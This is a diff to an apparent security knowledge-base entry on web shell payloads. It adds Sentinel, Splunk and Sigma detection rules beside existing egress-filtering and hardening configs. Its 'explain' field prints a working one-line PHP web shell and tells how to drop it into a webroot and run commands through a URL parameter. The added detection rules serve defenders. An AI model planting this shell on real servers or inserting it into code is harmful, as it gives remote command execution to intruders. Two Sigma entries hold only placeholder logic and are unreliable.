@@ -94,7 +94,77 @@
     ],
     "misconfiguration": "Outbound connections from servers are not filtered - any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
     "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows - PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
-    "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows - PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
+    "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows - PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution",
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Web Shell Payloads - Sentinel",
+        "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"w3wp.exe\",\"httpd\",\"apache2\",\"php-fpm\",\"php-cgi\",\"java.exe\",\"tomcat\")\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"sh\",\"bash\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine\n| union (DeviceFileEvents | where FileName endswith_any (\".php\",\".aspx\",\".jsp\") and FolderPath has_any (\"upload\",\"wwwroot\",\"webroot\",\"htdocs\") | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, InitiatingProcessFileName, ProcessCommandLine=FolderPath)\n| sort by Timestamp desc\n// web shell (php/aspx/jsp) - web server process spawning cmd/sh",
+        "data_source": "powershell",
+        "attack": [
+          "T1505.003"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "Web Shell Payloads (1) - Splunk",
+        "logic": "index=sysmon EventCode=1 (ParentImage=\"*w3wp.exe\" OR ParentImage=\"*httpd*\" OR ParentImage=\"*apache*\" OR ParentImage=\"*php*\" OR ParentImage=\"*tomcat*\" OR ParentImage=\"*java.exe\") (Image=\"*cmd.exe\" OR Image=\"*powershell.exe\" OR Image=\"*sh\")\n| table _time, Computer, ParentImage, Image, CommandLine",
+        "data_source": "sysmon",
+        "attack": [
+          "T1505.003"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "1"
+        ]
+      },
+      {
+        "platform": "splunk",
+        "name": "Web Shell Payloads (2) - Splunk",
+        "logic": "index=sysmon EventCode=11 (TargetFilename=\"*.php\" OR TargetFilename=\"*.aspx\" OR TargetFilename=\"*.jsp\") (TargetFilename=\"*upload*\" OR TargetFilename=\"*webroot*\")\n| table _time, Computer, Image, TargetFilename",
+        "data_source": "sysmon",
+        "attack": [
+          "T1505.003"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "11"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "web_shell_execution",
+        "logic": "web_shell_execution",
+        "data_source": "proxy",
+        "attack": [
+          "T1505.003"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "sigma",
+        "name": "file_event_web_shell_written",
+        "logic": "file_event_web_shell_written",
+        "data_source": "sysmon",
+        "attack": [
+          "T1505.003"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "powershell",
+        "proxy",
+        "sysmon"
+      ]
+    }
   },
   "explain": "A one-line web shell that runs OS commands from a URL parameter:\n  <?php system($_REQUEST[\"cmd\"]); ?>   execute whatever is passed as the 'cmd' parameter\nDrop it into the webroot (echo it to shell.php), then hit /shell.php?cmd=id to run commands as the web-server user; pick the language matching the app (PHP/JSP/ASP)."
 }
